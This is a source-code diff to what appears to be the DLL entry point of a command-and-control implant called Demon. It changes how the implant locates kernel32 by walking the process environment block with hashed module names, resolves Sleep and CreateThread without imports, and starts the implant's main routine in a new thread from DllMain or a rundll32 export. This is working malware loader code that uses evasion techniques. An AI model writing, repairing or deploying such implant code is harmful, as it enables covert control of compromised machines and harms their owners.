@@ -3,24 +3,50 @@
 #include <common/Defines.h>
 
 #ifndef SHELLCODE
-/* Export this for rundll32 or any other program that requires and exported functions...
- * TODO: make this function name optional/changeable in the payload generator.*/
-DLLEXPORT VOID Start(  )
+
+/* Instance-free PEB walker for use before DemonMain sets up the global Instance.
+ * LdrModulePeb dereferences Instance->Teb which is NULL at DllMain/Start time. */
+static PVOID FindModulePeb( DWORD Hash )
 {
-    /* prevent exiting if started using rundll32 or something */
-    PVOID Kernel32  = LdrModulePeb( H_MODULE_KERNEL32 );
+    PLDR_DATA_TABLE_ENTRY Ldr = NULL;
+    PLIST_ENTRY           Hdr = NULL;
+    PLIST_ENTRY           Ent = NULL;
+    PPEB                  Peb = NULL;
+
+    Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
+    Hdr = & Peb->Ldr->InLoadOrderModuleList;
+    Ent = Hdr->Flink;
+
+    for ( ; Hdr != Ent ; Ent = Ent->Flink ) {
+        Ldr = C_PTR( Ent );
+
+        if ( ( HashEx( Ldr->BaseDllName.Buffer, Ldr->BaseDllName.Length, TRUE ) == Hash ) || Hash == 0 ) {
+            return Ldr->DllBase;
+        }
+    }
+
+    return NULL;
+}
+
+static DWORD WINAPI DemonMainThread( LPVOID lpParam )
+{
+    DemonMain( lpParam, NULL );
+    return 0;
+}
+
+DLLEXPORT VOID Start( )
+{
+    PVOID Kernel32  = FindModulePeb( H_MODULE_KERNEL32 );
     VOID ( WINAPI *DoSleep ) (
         DWORD
     ) = LdrFunctionAddr( Kernel32, H_FUNC_SLEEP );
 
-    // calling sleep lowers the CPU consumed in this loop
     while ( TRUE ) {
         DoSleep( 24 * 60 * 60 * 1000 );
     }
 }
 #endif
 
-/* this is our entrypoint for the Dll (also for shellcode) */
 DLLEXPORT BOOL WINAPI DllMain(
     IN     HINSTANCE hDllBase,
     IN     DWORD     Reason,
@@ -32,19 +58,14 @@ DLLEXPORT BOOL WINAPI DllMain(
     {
 
 #if !defined(SHELLCODE) && defined(DEBUG)
-        /* if the dll is compiled in debug mode start a console to write our debug prints to */
         AllocConsole();
         freopen( "CONOUT$", "w", stdout );
 #endif
 
 #ifdef SHELLCODE
-        /* we dont need to make a new thread since we get loaded by our shellcode */
         DemonMain( hDllBase, Reserved );
 #else
-        /* if we don't compile for the shellcode then start a new thread.
-         * why? because if not then we get an ERROR_INVALID_STATE from WinHttpSendRequest
-         * because we can't make HTTP requests in DllMain which seems that WinHTTP doesn't like */
-        Kernel32 = LdrModulePeb( H_MODULE_KERNEL32 );
+        Kernel32 = FindModulePeb( H_MODULE_KERNEL32 );
         HANDLE ( WINAPI *NewThread ) (
                 LPSECURITY_ATTRIBUTES,
                 SIZE_T,
@@ -52,10 +73,9 @@ DLLEXPORT BOOL WINAPI DllMain(
                 LPVOID,
                 DWORD,
                 LPDWORD
-        ) = LdrFunctionAddr( Kernel32, H_FUNC_CREATETHREAD ); /* you can load another function here using
-                                                                 * LdrModulePeb or LdrModuleLoad then LdrFunctionAddr */
+        ) = LdrFunctionAddr( Kernel32, H_FUNC_CREATETHREAD );
 
-        NewThread( NULL, 0, C_PTR( DemonMain ), hDllBase, 0, NULL );
+        NewThread( NULL, 0, C_PTR( DemonMainThread ), hDllBase, 0, NULL );
 #endif
         return TRUE;
     }
